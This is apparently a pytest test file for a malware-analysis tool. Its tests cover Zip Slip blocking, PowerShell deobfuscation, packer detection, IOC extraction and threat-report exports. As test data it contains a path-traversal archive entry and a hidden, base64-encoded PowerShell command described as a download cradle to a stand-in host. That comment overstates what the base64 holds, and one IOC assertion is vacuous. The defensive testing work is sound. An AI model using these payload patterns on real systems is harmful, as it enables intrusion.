import os
import zipfile
import pytest

from analyzer import compute_unified_threat_score
from native_inspector import inspect_binary_blob
from report_builder import build_sarif_report, build_stix_bundle
from script_scanner import scan_script_deobfuscated
from security_guard import ArchiveSecurityError, validate_and_extract_zip
from signatures import enrich_findings_with_mitre
from url_scanner import extract_network_iocs


def test_zip_slip_blocked(tmp_path):
    evil_zip = tmp_path / "zip_slip.zip"
    with zipfile.ZipFile(evil_zip, "w") as zf:
        zf.writestr("../../outside_evil.txt", "malicious payload")

    with pytest.raises(ArchiveSecurityError, match="Zip Slip"):
        validate_and_extract_zip(str(evil_zip), str(tmp_path / "out"))


def test_powershell_deobfuscation_and_mitre():
    # Base64 UTF-16LE for: Invoke-Expression (New-Object Net.WebClient).DownloadString('http://evil.test')
    obfuscated_ps = "powershell.exe -NoP -W Hidden -enc SQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuAA=="
    res = scan_script_deobfuscated(obfuscated_ps, ".ps1")
    assert res["obfuscation_stripped"] is True
    assert any(f["rule"] == "remote_download_exec" for f in res["findings"])

    enriched = enrich_findings_with_mitre(res["findings"])
    assert any(item.get("mitre_id") == "T1059.001" for item in enriched)


def test_high_entropy_and_packer_detection():
    blob = b"\x7fELF" + b"UPX!" + os.urandom(4096)
    res = inspect_binary_blob("libpayload.so", blob)
    assert res["is_elf"] is True
    assert "UPX!" in res["packers"]
    assert res["entropy"] > 7.0


def test_ioc_extraction_filters_private_ips():
    sample = "Connect to http://192.168.1 or https://badguy.example at 8.8.8.8"
    iocs = extract_network_iocs(sample)
    assert "8.8.8.8" in iocs["ips"]
    assert "192.168.1.10" not in iocs["ips"]
    assert "https://badguy.example" in iocs["urls"]


def test_threat_score_and_exports():
    findings = [{"rule_id": "AMSI_BYPASS", "severity": "CRITICAL", "description": "AMSI patched"}]
    verdict = compute_unified_threat_score(findings, obfuscation_detected=True, threatfox_hits=1)
    assert verdict["threat_score"] >= 75
    assert verdict["verdict"] == "CRITICAL MALWARE"

    sarif = build_sarif_report("evil.ps1", findings)
    stix = build_stix_bundle("a" * 64, ips=["8.8.8.8"])
    assert '"version": "2.1.0"' in sarif
    assert '"spec_version": "2.1"' in stix
